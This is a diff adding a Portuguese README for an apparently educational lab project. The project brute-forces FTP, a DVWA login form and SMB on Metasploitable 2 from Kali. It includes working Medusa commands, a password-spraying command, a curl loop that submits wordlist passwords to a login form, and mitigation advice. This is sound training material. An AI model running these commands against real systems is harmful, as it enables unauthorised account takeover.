@@ -1,0 +1,115 @@
+
+# Projeto: Auditoria de Força Bruta — Kali + Medusa
+
+**Resumo**  
+Projeto didático que simula ataques de força bruta em um ambiente controlado (duas VMs — Kali Linux e Metasploitable 2) com o objetivo de entender técnicas de teste, validar vetores (FTP, formulário web e SMB) e propor medidas de mitigação. Todos os testes descritos foram realizados em ambiente isolado e autorizações apropriadas.
+
+---
+
+## Estrutura do repositório
+```
+/README.md
+/wordlists/common_passwords.txt
+/wordlists/users.txt
+/scripts/medusa_commands.sh
+/docs/TEST_PLAN.md
+/docs/RESULTS_TEMPLATE.md
+/images/  (opcional: capturas de tela)
+```
+
+---
+
+## Ambiente
+- Hypervisor: VirtualBox
+- VM alvo: Metasploitable 2 
+- VM atacante: Kali Linux
+- Rede: Host-only / Internal Network
+
+---
+
+## Cenários testados
+1. **FTP (vsftpd)** — força bruta para encontrar credenciais válidas.
+2. **Formulário Web (DVWA)** — automação básica de tentativas de login (cenário com configuração DVWA em nível baixo para fins didáticos).
+3. **SMB (Samba)** — password spraying com enumeração prévia de usuários.
+
+---
+
+## Wordlists utilizadas
+Arquivos em `/wordlists`.
+
+- `common_passwords.txt` — lista curta com senhas comuns.
+- `users.txt` — lista de nomes de usuário.
+
+**Exemplo de conteúdo** (veja `/wordlists` neste repositório).
+
+---
+
+## Comandos e procedimentos
+> Substitua `192.168.56.101` pelo IP real da VM alvo. Todos os comandos foram executados a partir de Kali. Ajuste caminhos conforme seu ambiente.
+
+### 1) Força bruta FTP com Medusa
+```bash
+# Exemplo: teste contra serviço FTP
+medusa -h 192.168.56.101 -u ftpuser -P wordlists/common_passwords.txt -M ftp -T 4 -f
+# -h alvo, -u usuário único, -P wordlist, -M módulo (ftp), -T threads, -f para parar no primeiro sucesso
+```
+
+Para testar múltiplos usuários:
+```bash
+medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/common_passwords.txt -M ftp -T 6
+```
+
+### 2) Automação de tentativas em formulário web
+Formulários web modernos costumam ter tokens CSRF e proteções. Para um formulário simples sem CSRF:
+```bash
+# loop simples com curl
+for pw in $(cat wordlists/common_passwords.txt); do
+  curl -s -X POST -d "username=admin&password=${pw}" http://192.168.56.101/dvwa/login.php -c /tmp/cookie.txt -L -o /dev/null
+  # avaliar resposta (HTTP status, presença de texto que indica sucesso)
+done
+```
+
+### 3) Password spraying / SMB com Medusa
+```bash
+# Exemplo de password spraying: vários usuários com poucas senhas
+medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/common_passwords.txt -M smb -T 6
+```
+
+---
+
+## Validação de acessos
+- Para FTP: confirmar `ls` ou `get` após login bem-sucedido usando `ftp`/`lftp` ou `ncftp`.
+- Para Web: verificar resposta que indica sessão autenticada (cookie de sessão, página restrita).
+- Para SMB: usar `smbclient -L //192.168.56.101 -U username` para listar recursos com credenciais encontradas.
+
+---
+
+## Exemplo de plano de testes (veja `/docs/TEST_PLAN.md`)
+- Definir objetivos e escopo (IPs, serviços permitidos)
+- Captura de baseline (nmap -sV -p-)
+- Enumeração de usuários e serviços
+- Execução controlada de ataques por serviço
+- Registro de tentativas, resultados e tempo
+- Remediação proposta
+
+---
+
+## Recomendações de mitigação
+- Implementar **política de senhas fortes** e bloqueio/lockout após N tentativas.
+- Ativar **rate limiting** e captchas em formulários de login.
+- Habilitar **autenticação multifator (MFA)** quando aplicável.
+- Monitoramento e alertas para múltiplas falhas de autenticação.
+- Auditoria de contas com senha padrão/comprometida e proteção de serviços desnecessários.
+
+---
+
+## Evidências e documentação
+- Salve logs de execução (`/var/log/medusa.out` ou redirecionamentos) e screenshots em `/images`.
+- Preencha o template em `/docs/RESULTS_TEMPLATE.md` com observações, timestamps e recomendações.
+
+---
+
+## Observações finais
+Trate este repositório como um guia didático. Ajuste parâmetros (threads, delays) para não sobrecarregar a rede e para simular cenários realistas. Documente cuidadosamente cada execução para fins de auditoria.
+
+---
